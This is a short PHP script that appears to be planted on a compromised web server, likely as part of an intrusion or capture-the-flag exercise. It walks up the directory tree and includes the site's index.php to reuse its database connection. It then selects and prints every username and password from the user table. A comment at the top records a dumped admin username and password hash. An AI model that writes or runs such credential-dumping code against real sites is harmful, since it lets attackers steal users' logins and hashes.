<?php
//username: drunkadmin password: 3c9e2e799cca6538238082912566dd86
echo "9\n";
set_include_path('./../');
chdir('./../../../../');
//include("index.php");
echo getcwd();

$path    = './';
$files = scandir($path);
//print_r($files);
include "index.php";

$query = mysql_query("SELECT username, password FROM user WHERE 1=1");
while ( $myrow = mysql_fetch_assoc($query) ){
      echo "username: ".$myrow['username']." password: ".$myrow['password'];
      echo "\n";
}

?>
